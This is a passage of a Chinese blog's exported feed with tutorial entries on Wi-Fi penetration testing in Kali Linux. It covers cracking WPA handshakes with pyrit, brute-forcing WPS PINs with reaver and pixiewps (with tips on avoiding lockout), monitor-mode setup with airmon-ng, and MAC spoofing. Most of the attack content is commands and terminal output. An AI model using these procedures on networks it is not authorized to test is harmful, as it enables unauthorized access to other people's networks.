airodump抓到的包给pyrit使用的话，要先进行格式转换</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure>
<p> pyrit -r wpa.cap -o wpapyrit.cap strip</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    - stip提出掉没有用的包，只留下握手相关的包</span><br><span class="line">    - -r，指定airodump抓的包</span><br><span class="line">    - -o，格式转换后保存到本地的包</span><br><span class="line"></span><br><span class="line">  - 也可以analyse进行分析</span><br><span class="line"></span><br><span class="line">### （3）破解相关</span><br><span class="line"></span><br><span class="line">- 使用密码字典直接破解</span><br><span class="line"></span><br><span class="line">  - `pyrit -r wpapyrit.cap -i password.lst -b &lt;AP MAC&gt; attack_passthrough`</span><br><span class="line">  - attack_passthrough 是参数，表示直接进行密码破解</span><br><span class="line">  - 破解速度比cowpatty好点，但是比crack差</span><br><span class="line">  - 但用密码字典这种方式破解，还是首推crack</span><br><span class="line"></span><br><span class="line">- 数据库模式破解</span><br><span class="line"></span><br><span class="line">  - 默认使用基于文件的数据库，支持连接sql数据库（MySQL等），将计算的PMK存入数据库</span><br><span class="line"></span><br><span class="line">  - 查看默认数据库状态：`pyrit eval`（数据库是否连接、可用的密码个数等）</span><br><span class="line"></span><br><span class="line">  - 导入密码字典：`pyrit -i password.lst import_passwords`（也会自动剔除不合格密码）</span><br><span class="line"></span><br><span class="line">  - 指定ESSID： `pyrit -e kifi create_essid`</span><br><span class="line"></span><br><span class="line">  - 计算PMK：</span><br></pre></td></tr></table></figure>
<p> pyrit batch</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  （发挥GPU计算能力）</span><br><span class="line"></span><br><span class="line">  - 虚拟机没有GPU可言，发挥不出pyrit该有优势</span><br><span class="line">  - 若硬件满足条件，存在GPU，效率是很高的（也取决于显卡好坏</span><br><span class="line">  - 计算后的PMK存储在数据库后，就可以进行后续破解</span><br><span class="line"></span><br><span class="line">- 破解密码：</span><br></pre></td></tr></table></figure>
<p> pyrit -r wpapyrit.cap -b <ap mac> attack_db</ap></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    - 参数attack-db，表示从数据库中导入PMK，进行破解</span><br><span class="line">    - 若数据包中只有一个待破解AP，不需要-b指定其MAC地址</span><br><span class="line"></span><br><span class="line">  - pyrit可以连接到数据库，如mysql，日后破解时，直接从数据库中调取（可以创建一个专门用于密码破解的数据库）</span><br><span class="line"></span><br><span class="line">### （4）实例演示</span><br><span class="line"></span><br><span class="line">&gt; 若采用密码字典的方式，还是首推aircrack，不再演示此方式</span><br><span class="line">&gt;</span><br><span class="line">&gt; 以数据库模式的破解为例，即提前生成PMK的方式</span><br><span class="line"></span><br><span class="line">1. `pyrit -e D-Link_DIR-612 create_essid`，指定ESSID</span><br></pre></td></tr></table></figure>
<p>root@kali:~# pyrit -e D-Link_DIR-612 create_essid<br>Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora<br><a href="https://github.com/JPaulMora/Pyrit" target="_blank" rel="noopener">https://github.com/JPaulMora/Pyrit</a><br>This code is distributed under the GNU General Public License v3+</p>
<p>Connecting to storage at ‘file://‘…  connected.<br>Created ESSID ‘D-Link_DIR-612’</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2. `pyrit -i dic.txt import_passwords`，导入密码文件</span><br></pre></td></tr></table></figure>
<p>root@kali:~# pyrit -i dic.txt import_passwords<br>Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora<br><a href="https://github.com/JPaulMora/Pyrit" target="_blank" rel="noopener">https://github.com/JPaulMora/Pyrit</a><br>This code is distributed under the GNU General Public License v3+</p>
<p>Connecting to storage at ‘file://‘…  connected.<br>11080 lines read. Flushing buffers…<br>All done.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">3. `pyrit eval`，查看数据库状态，看当前的ESSID、可用的password</span><br></pre></td></tr></table></figure>
<p>root@kali:~# pyrit eval<br>Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora<br><a href="https://github.com/JPaulMora/Pyrit" target="_blank" rel="noopener">https://github.com/JPaulMora/Pyrit</a><br>This code is distributed under the GNU General Public License v3+</p>
<p>Connecting to storage at ‘file://‘…  connected.<br>Passwords available: 11</p>
<p>ESSID ‘D-Link_DIR-612’ : 0 (0.00%)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">4. `pyrit batch`，计算PMK</span><br></pre></td></tr></table></figure>
<p>root@kali:~# pyrit batch<br>Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora<br><a href="https://github.com/JPaulMora/Pyrit" target="_blank" rel="noopener">https://github.com/JPaulMora/Pyrit</a><br>This code is distributed under the GNU General Public License v3+</p>
<p>Connecting to storage at ‘file://‘…  connected.<br>Working on ESSID ‘D-Link_DIR-612’<br>Processed all workunits for ESSID ‘D-Link_DIR-612’; 17 PMKs per second.</p>
<p>Batchprocessing done.<br>root@kali:~# </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">5. `pyrit -r test.cap attack_db` ，开始破解</span><br></pre></td></tr></table></figure>
<p>root@kali:~# pyrit -r test.cap attack_db<br>Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora<br><a href="https://github.com/JPaulMora/Pyrit" target="_blank" rel="noopener">https://github.com/JPaulMora/Pyrit</a><br>This code is distributed under the GNU General Public License v3+</p>
<p>Connecting to storage at ‘file://‘…  connected.<br>Parsing file ‘test.cap’ (1/1)…<br>Parsed 3118 packets (3118 802.11-packets), got 1 AP(s)</p>
<p>Picked AccessPoint c4:a8:1d:e1:65:f8 (‘D-Link_DIR-612’) automatically.<br>Attacking handshake with Station 70:f0:87:7f:2b:91…<br>Tried 7 PMKs so far (63.6%); 1737 PMKs per second.</p>
<p>The password is ‘12341234’.<br><code>`</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>无线攻击</tag>
        <tag>Tool</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>WPS攻击</title>
    <url>/2018/02/18/wireless/WPS%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="01-简介"><a href="#01-简介" class="headerlink" title="01-简介"></a>01-简介</h2><ul>
<li>WPS<ul>
<li>WPS，wireless protected setup</li>
<li>Wi-Fi联盟2006年开发的一项技术</li>
<li>2011年被发现安全设计漏洞</li>
</ul>
</li>
<li>使用场景<ul>
<li>前提：终端设备（如PC、手机、USB网卡）和AP都支持WPS功能</li>
<li>路由器和网卡各按一个按钮就能接入无线<a id="more"></a></li>
<li>终端按：发出请求连接AP，AP按：响应请求，允许其连接</li>
<li>按按钮是一个物理性的身份验证动作</li>
</ul>
</li>
<li><p>设计初衷</p>
<ul>
<li>PSK设的太复杂不便于记忆，太简单又易于破解</li>
<li>PSK即密码的分发也是不安全的（向A说的同时B可能也会听到）</li>
<li>通过PIN码来简化无线接入的操作，无需记住PSK</li>
</ul>
</li>
<li><p>简化终端连接AP的动作，又安全、又简化</p>
</li>
<li>PIN<ul>
<li>每个支持WPA的无线AP，其中硬编码一个PIN码，用于加密于STA通信过程</li>
<li>PIN码是分为前后各4位的2段共8位数字</li>
<li>PIN有八位数字，理论上大约有一个亿的组合</li>
<li>早期的PIN码就是AP的MAC地址<ul>
<li>前三个16进制字节转化为10进制</li>
<li>用计算器就可以直接算出PIN<ul>
<li>C83A35（十进制13122101）</li>
<li>00B00C（十进制00045068）</li>
</ul>
</li>
<li>早期的弱智AP，现在应该没有了</li>
</ul>
</li>
</ul>
</li>
<li>WPS功能相关<ul>
<li>包括Linksys在内的很多厂家的无线路由器无法关闭WPS功能</li>
<li>只要AP有此功能，就不可被关闭，除非返厂</li>
<li>即使在web界面中有关闭WPS，配置也不会生效</li>
</ul>
</li>
<li>攻击原理<ul>
<li>接入发起方可以根据路由器的返回信息判断前四位是否正确<ul>
<li>穷举前4位来依次判断是否正确</li>
<li>大约10000种可能</li>
</ul>
</li>
<li>而pin码的后四位只有1000种定义的组合（因最后一位是checksum，故只尝试3位</li>
<li>所以全部穷举破解只需要10000+1000次尝试<ul>
<li>而8位PSK（大小写字母和数字），共有218,340,105,584,896种可能</li>
<li>理想情况下（无锁定机制等），15-20小时必然可以破解出来（不同于WPA破解基于字典，要看运气）</li>
</ul>
</li>
<li>即使没有客户端使用WPS连接到AP，使用的还是共享密钥的方式来进行身份验证，攻击者也可以尝试11000次，一旦取得PIN，客户端就可以连接到AP</li>
<li>攻击难度相对较低（理论上，时间允许都可以破解出来），防御却十分困难</li>
<li>比WPA攻击要有效率的多（WPA字典攻击的不足）</li>
</ul>
</li>
<li>锁定机制防穷举<ul>
<li>多次失败之后锁定，拒绝下次尝试</li>
<li>标准本身没有设计锁定机制</li>
<li>但目前多个厂商已实现锁定机制</li>
<li>要避免被锁定，要注意破解的速度不要太快，每个厂商的锁定机制也各不相同</li>
<li>很多厂家实现了锁定机制，所以爆破时应注意限速</li>
<li>一旦触发锁定，可尝试耗尽AP连接数，令其重启以解除WPS锁定<ul>
<li>利用fake authentication，伪造连接</li>
<li>AP支持的客户端连接是有限的</li>
<li>停留在理论层面，并没有实际验证，为攻击行为且太明显</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="02-实例演示"><a href="#02-实例演示" class="headerlink" title="02-实例演示"></a>02-实例演示</h2><ul>
<li><p>启动monitor模式后，wash命令来发现支持WPS的AP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# wash -i wlan0mon</span><br><span class="line"></span><br><span class="line">Wash v1.5.3 WiFi Protected Setup Scan Tool</span><br><span class="line">Copyright (c) 2011, Tactical Network Solutions, Craig Heffner</span><br><span class="line">mod by t6_x&lt;t6_x@hotmail.com&gt;, DataHead, Soxrok2212, Wiire, AAnarchYY &amp; rofl0r</span><br><span class="line"></span><br><span class="line">BSSID              Ch  dBm  WPS  Lck  ESSID</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">C4:A8:1D:E1:65:F8   1  00  1.0  No   D-Link_DIR-612</span><br></pre></td></tr></table></figure>
<ul>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wash -C -i wlan0mon</span><br></pre></td></tr></table></figure>
<ul>
<li>-C，忽略错误帧的报警信息（实测已无此参数）</li>
<li>-i，指定使用的网卡</li>
</ul>
</li>
<li><p>已经发现支持WPS的AP，发现后也可以碰碰运气，看是否是早期的脑残AP，把MAC地址前三位作为PIN</p>
</li>
<li><p>Lck，表示当前是否是被锁定状态，而不是是否启动锁定机制</p>
<ul>
<li>当前为No，表示并没有锁定</li>
<li>若触发锁定机制，被锁后显示Yes，被锁定后AP会拒绝WPS的PIN码的探测，即无法再进行PIN尝试</li>
</ul>
</li>
</ul>
</li>
<li><p>airodump也可以用来探测支持WPS的AP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CH  4 ][ Elapsed: 24 s ][ 2018-02-10 19:01 ][ resumed output                                                                </span><br><span class="line">BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH WPS     ESSID         </span><br><span class="line">C4:A8:1D:E1:65:F8  -63       13        1    0   1  54e  WPA2 CCMP   PSK  1.0     D-Link_DIR-612</span><br><span class="line">C0:61:18:59:E4:BA  -88        8        0    0  11  54e. WPA2 CCMP   PSK          &lt;length:  0&gt; </span><br><span class="line">84:71:2A:A8:56:F6  -91        2        0    0   6  54e. OPN                      CMCC-WEB     </span><br><span class="line">E4:F3:F5:AF:6E:24  -89        5        0    0  13  54e  WPA2 CCMP   PSK          MERCURY_6E24</span><br></pre></td></tr></table></figure>
<ul>
<li><code>airodump-ng wlan0mon --wps</code></li>
<li>也会抓其他的AP，只不过支持WPS的会显示出版本号</li>
<li>早期是不支持此功能的</li>
</ul>
</li>
<li><p>reaver爆破PIN码</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reaver -i wlan0mon -b C4:A8:1D:E1:65:F8 -c 1 -vv</span><br></pre></td></tr></table></figure>
<ul>
<li>-b，指定AP的MAC地址</li>
<li>-vv，显示更详细的信息</li>
<li>-c，指定AP工作的信道（尽量加，节约时间）</li>
</ul>
</li>
<li><p>爆破的过程中同时运行wash，观察Lck字段，实时检测目标是否已被触发锁定</p>
</li>
<li><p>刚开始都会以PIN码：12345670来尝试，后面会尝试随机PIN</p>
</li>
<li><p>因各种因素，破解工作可能不会正常进行（尝试重新插拔网卡）</p>
</li>
</ul>
</li>
<li><p>秒破PIN码（针对某些厂家）</p>
<ul>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reaver -i wlan0mon -b C4:A8:1D:E1:65:F8 -vv -K 1</span><br></pre></td></tr></table></figure>
<ul>
<li>-K 1，只适用于固定厂商的芯片，成功率很低，</li>
</ul>
</li>
<li><p>某些厂家的芯片天生就存在漏洞，但很少见（遇见则秒破）</p>
</li>
<li><p>-K 1，其实在reaver中调用了另外一个命令（pixiewps）来进行攻击</p>
</li>
<li><p>其实很多工具的功能都是基于已有工具来开发的，如上reaver调用pixiewps</p>
</li>
</ul>
</li>
<li><p>根据PIN码得密码</p>
<ul>
<li><code>reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -p 88888888</code></li>
<li>若得到AP的PIN码，则-p参数指定后，可直接得到密码（PSK）</li>
</ul>
</li>
<li><p>综合自动化无线密码破解工具 wifite（支持WEP、WPA、WPS）</p>
<ul>
<li>直接wifite即可</li>
<li>若网卡没有启用monitor模式，则会自动创建一个monitor的网卡；如果事先已经有了，则直接用</li>
<li>发现周围AP后，ctrl+c退出监听模式，输入AP的num展开攻击（会先尝试WPS）</li>
<li>注意：wifite下发现上述测试的AP是不支持WPS的（以哪个为准？）</li>
</ul>
</li>
<li><p>pixiewps使用</p>
<ul>
<li><p>效果类似于reaver -K 1参数</p>
</li>
<li><p>也是针对的特定的有漏洞的芯片</p>
</li>
<li><p><code>pixiewps -e &lt;pke&gt; -r &lt;pkr&gt; -s &lt;e-hash1&gt; -z &lt;e-hash2&gt; -a &lt;authkey&gt; -n &lt;e-nonce&gt;</code></p>
<ul>
<li><p>以上这些值都可以在reaver破解PIN码的过程中找到（前提是破解过程正常进行，实际中常常是失败的）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-2-10/85373824.jpg?ynotemdtimestamp=1550490873683" alt="img"></p>
</li>
</ul>
</li>
<li><p>通过此工具破解出PIN后，reaver用-p指定后，可以直接得到密码</p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>无线攻击</tag>
        <tag>Tool</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux无线协议栈及常用命令</title>
    <url>/2018/02/18/wireless/Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="Linux无线协议栈及常用命令"><a href="#Linux无线协议栈及常用命令" class="headerlink" title="Linux无线协议栈及常用命令"></a>Linux无线协议栈及常用命令</h1><h2 id="协议栈简介"><a href="#协议栈简介" class="headerlink" title="协议栈简介"></a>协议栈简介</h2><ul>
<li>两个层面<ul>
<li>内核层面<ul>
<li>面向硬件</li>
<li>内核提供的网络接口</li>
<li>为不同厂家生产的不同设备及驱动，提供一个统一接口，即network stack网络协议栈</li>
</ul>
</li>
<li>用户层面<a id="more"></a><ul>
<li>面向用户</li>
<li>用户输入的系统命令<ul>
<li>wpa_suplicant：为上层的网络管理模块提供服务</li>
<li>ifconfig</li>
<li>iwconfig</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>历史发展<ul>
<li>早期的ieee 80211（iwconfig、iwlist等命令</li>
<li>如今的mac80211（iw等命令</li>
</ul>
</li>
</ul>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul>
<li>查看无线网卡<ul>
<li>ifconfig<ul>
<li>ifconfig wlan0 up/down（打开或关闭网卡）</li>
<li>直接加网卡名显示详细信息</li>
</ul>
</li>
<li>iwconfig</li>
<li>直接加网卡名显示详细信息<ul>
<li>iwconfig wlan0 txpower on/off（打开或关闭网卡）</li>
</ul>
</li>
<li>iw list<ul>
<li>查看支持的借口模式（如是否支持AP和monitor模式</li>
</ul>
</li>
<li>iwlist（无空格</li>
</ul>
</li>
<li>信道频率<ul>
<li>iwlist wlan2 frequency</li>
<li>iw list</li>
</ul>
</li>
<li>扫描附近AP<ul>
<li>iw dev wlan2 scan | grep SSID</li>
<li>iw dev wlan2 scan | egrep “DS\ Parameter\ set | SSID</li>
<li>iwlist wlan2 scanning | egrep “ESSID | Channel”</li>
</ul>
</li>
<li><p>添加或删除侦听端口</p>
<ul>
<li>1、iw dev wlan2 interface add wlan2mon type monitor<ul>
<li>将网卡设置为monitor模式，以便可以抓到无线的包</li>
<li>无线侦听网卡的名字必须设置成wlan+数字+mon的形式（如今版本是这样要求的</li>
<li>将网卡设置成monitor模式，才可以进行无线包头802.11的侦听</li>
<li>基于一个已存在网卡，创建一个新的网卡接口</li>
</ul>
</li>
<li>2、ifconfig启动新添加的，再iwconfig 查看<ul>
<li>多出了一个wlan2mon的无线网卡</li>
<li>且其模式为monitor</li>
</ul>
</li>
<li>3、设置为monitor后，就可以进行无线的侦听<ul>
<li>可以tcpdump，tcpdump -s 0 -i wlan2mon -p</li>
<li>也可以Wireshark</li>
</ul>
</li>
<li>4、删除：w dev wlan2mon interface del</li>
<li>出错问题及解决<ul>
<li>network-manager问题<ul>
<li>图形界面下进行网络相关的设置，都是通过network manager服务完成的</li>
<li>无线渗透过程中，要将网卡设置monitor模式，设置的命令是与network manager服务冲突的，导致命令执行失败</li>
<li>故要将此服务先停掉，service network-manager stop</li>
</ul>
</li>
<li>网卡默认down状态<ul>
<li>刚刚增加的的无线网卡是处于down状态的</li>
<li>ifconfig是不可见的（默认只显示up的</li>
<li>ifconfig -a是可见的（up和down都显示</li>
<li>ifconfig wlan0 up，先将网卡启动起来，ifconfig后就可见</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>更改无线网卡的信道</p>
<ul>
<li><p><code>airmon-ng start wlan0</code>启动监听时没有指定端口，有些操作需要无线网卡与AP工作在同一信道</p>
</li>
<li><p>启动监听时，可以指定信道，如<code>airmon-ng start wlan0</code></p>
</li>
<li><p><code>iwlist wlan0mon channel</code>可以查看当前网卡信道</p>
</li>
<li><p>启动之后，也可以手动更改，<code>iw dev wlan0mon set channel 11</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# iwlist wlan0mon channel</span><br><span class="line">wlan0mon  13 channels in total; available frequencies :</span><br><span class="line">          Channel 01 : 2.412 GHz</span><br><span class="line">          Channel 02 : 2.417 GHz</span><br><span class="line">          Channel 03 : 2.422 GHz</span><br><span class="line">          Channel 04 : 2.427 GHz</span><br><span class="line">          Channel 05 : 2.432 GHz</span><br><span class="line">          Channel 06 : 2.437 GHz</span><br><span class="line">          Channel 07 : 2.442 GHz</span><br><span class="line">          Channel 08 : 2.447 GHz</span><br><span class="line">          Channel 09 : 2.452 GHz</span><br><span class="line">          Channel 10 : 2.457 GHz</span><br><span class="line">          Channel 11 : 2.462 GHz</span><br><span class="line">          Channel 12 : 2.467 GHz</span><br><span class="line">          Channel 13 : 2.472 GHz</span><br><span class="line">          Current Frequency:2.457 GHz (Channel 10)</span><br><span class="line"></span><br><span class="line">root@kali:~# iw dev wlan0mon set channel 11</span><br><span class="line">root@kali:~# iwlist wlan0mon channel</span><br><span class="line">wlan0mon  13 channels in total; available frequencies :</span><br><span class="line">          Channel 01 : 2.412 GHz</span><br><span class="line">          Channel 02 : 2.417 GHz</span><br><span class="line">          Channel 03 : 2.422 GHz</span><br><span class="line">          Channel 04 : 2.427 GHz</span><br><span class="line">          Channel 05 : 2.432 GHz</span><br><span class="line">          Channel 06 : 2.437 GHz</span><br><span class="line">          Channel 07 : 2.442 GHz</span><br><span class="line">          Channel 08 : 2.447 GHz</span><br><span class="line">          Channel 09 : 2.452 GHz</span><br><span class="line">          Channel 10 : 2.457 GHz</span><br><span class="line">          Channel 11 : 2.462 GHz</span><br><span class="line">          Channel 12 : 2.467 GHz</span><br><span class="line">          Channel 13 : 2.472 GHz</span><br><span class="line">          Current Frequency:2.462 GHz (Channel 11)</span><br></pre></td></tr></table></figure>
</li>
<li><p>但是最好还是启动时指定信道（后续更改信道，再进行实操，可能出出现错误）</p>
</li>
<li><p>无线操作时，总是错误百出，重新插拔网卡、再键入命令、重新执行某操作等，耐心……</p>
</li>
</ul>
</li>
<li><p>实践之前的常用操作</p>
<ul>
<li><code>service network-maneger stop</code></li>
<li><code>airmon-ng check kill</code></li>
</ul>
<p>（上述这两条，尽量在USB映射到虚拟机之前运行，也没那么绝对，视情况而定，遇到错误时可以一试）</p>
<ul>
<li><code>airmon-ng start wlan0</code>（可以手动指定信道）</li>
</ul>
</li>
<li><p>更改本机无线网卡MAC地址</p>
<ul>
<li><code>ifconfig wlan0 down</code></li>
<li><code>macchanger -m xx:xx:xx:xx:xx:xx wlan0</code></li>
<li><code>ifconfig wlan0 up</code></li>
</ul>
</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>无线安全</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
      </tags>
  </entry>
  <entry>
    <title>无线渗透工具</title>
    <url>/2018/02/18/wireless/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="无线渗透实操"><a href="#无线渗透实操" class="headerlink" title="无线渗透实操"></a>无线渗透实操</h1><h2 id="01-aircrack-ng简介"><a href="#01-aircrack-ng简介" class="headerlink" title="01-aircrack-ng简介"></a>01-aircrack-ng简介</h2><ul>
<li>无线渗透和审计神器</li>
<li>包含各种功能的工具套件（而非单个工具）<ul>
<li>网络监测</li>
<li>嗅探抓包</li>
<li>包注入</li>
<li>密码破解<a id="more"></a></li>
</ul>
</li>
<li><p>aircrack-ng仅仅是套件中一个工具，以其来此套件</p>
</li>
<li><p>建议关闭<code>network-maneger</code>服务，存在冲突问题，可能会导致后续操作出错</p>
<p><code>service network-maneger stop</code></p>
</li>
<li><p><code>ifconfig</code>不显示wlan0</p>
<ul>
<li><code>ifconfig -a</code>是显示所有的，包括未启动的</li>
<li><code>iwconfig</code>会显示（即使没有启动</li>
<li><code>ifconfig wlan0 up</code>启动网卡</li>
</ul>
</li>
</ul>
<h2 id="02-airmon-ng（侦听）"><a href="#02-airmon-ng（侦听）" class="headerlink" title="02-airmon-ng（侦听）"></a>02-airmon-ng（侦听）</h2><h3 id="2-1-检查网卡驱动"><a href="#2-1-检查网卡驱动" class="headerlink" title="2.1-检查网卡驱动"></a>2.1-检查网卡驱动</h3><ul>
<li><p><code>airmon-ng</code>检查网卡驱动信息，如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHY     Interface       Driver          Chipset</span><br><span class="line">phy1    wlan0           ath9k_htc       Atheros Communications, Inc. AR9271 802.11n</span><br></pre></td></tr></table></figure>
<ul>
<li>显示出当前的驱动信息、目前网卡使用的芯片</li>
<li>驱动问题往往是很棘手的；驱动更新、打补丁</li>
</ul>
</li>
<li><p><code>airmon-ng check</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# airmon-ng check</span><br><span class="line"></span><br><span class="line">Found 2 processes that could cause trouble.</span><br><span class="line">If airodump-ng, aireplay-ng or airtun-ng stops working after</span><br><span class="line">a short period of time, you may want to run &apos;airmon-ng check kill&apos;</span><br><span class="line"></span><br><span class="line">  PID Name</span><br><span class="line"> 1421 wpa_supplicant</span><br><span class="line">31531 dhclient</span><br></pre></td></tr></table></figure>
<ul>
<li><p>不是检测网卡的驱动等硬件信息，而是检测aircrack-ng套件在使用过程中与当前系统是否产生冲突的问题</p>
</li>
<li><p>可以手动<code>kill + pid</code> 一个一个删除，但是效率低</p>
</li>
<li><p><code>airmon-ng check kill</code>会把所有可能产生问题的进程全部kill</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# airmon-ng check kill</span><br><span class="line"></span><br><span class="line">Killing these processes:</span><br><span class="line"></span><br><span class="line">  PID Name</span><br><span class="line"> 1421 wpa_supplicant</span><br><span class="line">31531 dhclient</span><br><span class="line"></span><br><span class="line">root@kali:~# airmon-ng check</span><br><span class="line"># 无显示</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="2-2-开启和停止无线侦听"><a href="#2-2-开启和停止无线侦听" class="headerlink" title="2.2-开启和停止无线侦听"></a>2.2-开启和停止无线侦听</h3><ul>
<li><p><code>airmon-ng start wlan0</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# airmon-ng start wlan0</span><br><span class="line"></span><br><span class="line">PHY     Interface       Driver          Chipset</span><br><span class="line">phy1    wlan0           ath9k_htc       Atheros Communications, Inc. AR9271 802.11n</span><br><span class="line"></span><br><span class="line">                (mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)</span><br><span class="line">                (mac80211 station mode vif disabled for [phy1]wlan0)</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>iw dev wlan2 interface add wlan2mon type monitor</code>方法也可以，在这利用<code>aircrack-ng中的airmon-ng</code>来实现而已</p>
</li>
<li><p>在wlan0网卡上启动无线侦听，即monitor模式，后续大部分操作都是基于此模式下的，而非默认的managed模式</p>
</li>
<li><p>mac80211便是当前的无线协议栈（早期的ieee 80211</p>
</li>
<li><p>wlan0变为wlan0mon后enable，并置为monitor模式</p>
</li>
<li><p>同时，disable掉wlan0</p>
</li>
<li><p>再ifconfig后，则出现wlan0mon（wlan0没有了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# ifconfig</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">wlan0mon: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        unspec 6C-FD-B9-B2-9B-9C-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)</span><br><span class="line">        RX packets 75800  bytes 17702601 (16.8 MiB)</span><br><span class="line">        RX errors 0  dropped 75800  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>iwconfig后，发现wlan0mon已经是monitor模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# iwconfig</span><br><span class="line">wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm</span><br><span class="line">          Retry short limit:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:off</span><br><span class="line"></span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">lo        no wireless extensions.</span><br></pre></td></tr></table></figure>
</li>
<li><p>原来wlan0是管理模式，即Mode:Managed，默认模式，此模式下可以正常连接无线网络上网）</p>
</li>
</ul>
</li>
<li><p><code>iwlist wlan0mon channel</code>查看信道信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# iwlist wlan0mon channel</span><br><span class="line">wlan0mon  13 channels in total; available frequencies :</span><br><span class="line">          Channel 01 : 2.412 GHz</span><br><span class="line">          Channel 02 : 2.417 GHz</span><br><span class="line">          Channel 03 : 2.422 GHz</span><br><span class="line">          Channel 04 : 2.427 GHz</span><br><span class="line">          Channel 05 : 2.432 GHz</span><br><span class="line">          Channel 06 : 2.437 GHz</span><br><span class="line">          Channel 07 : 2.442 GHz</span><br><span class="line">          Channel 08 : 2.447 GHz</span><br><span class="line">          Channel 09 : 2.452 GHz</span><br><span class="line">          Channel 10 : 2.457 GHz</span><br><span class="line">          Channel 11 : 2.462 GHz</span><br><span class="line">          Channel 12 : 2.467 GHz</span><br><span class="line">          Channel 13 : 2.472 GHz</span><br><span class="line">          Current Frequency:2.457 GHz (Channel 10)</span><br></pre></td></tr></table></figure>
<ul>
<li>支持13个信道</li>
<li>当前工作信道10上</li>
</ul>
</li>
<li><p><code>airmon-ng start wlan0 3</code></p>
<ul>
<li>手动指定其信道</li>
<li>信道号1-13</li>
</ul>
</li>
<li><p><code>airmon-ng stop wlan0mon</code>关闭监听模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# airmon-ng stop wlan0mon</span><br><span class="line">PHY     Interface       Driver          Chipset</span><br><span class="line">phy1    wlan0mon        ath9k_htc       Atheros Communications, Inc. AR9271 802.11n</span><br><span class="line"></span><br><span class="line">                (mac80211 station mode vif enabled on [phy1]wlan0)</span><br><span class="line">                (mac80211 monitor mode vif disabled for [phy1]wlan0mon)</span><br></pre></td></tr></table></figure>
<ul>
<li><p>监听工作结束后，还原至管理模式（原来wlan0是管理模式，即Mode:Managed，默认模式，此模式下可以正常连接无线网络上网）</p>
</li>
<li><p>wlan0mon被wlan0取而代之</p>
</li>
<li><p>模式由monitor变为managed</p>
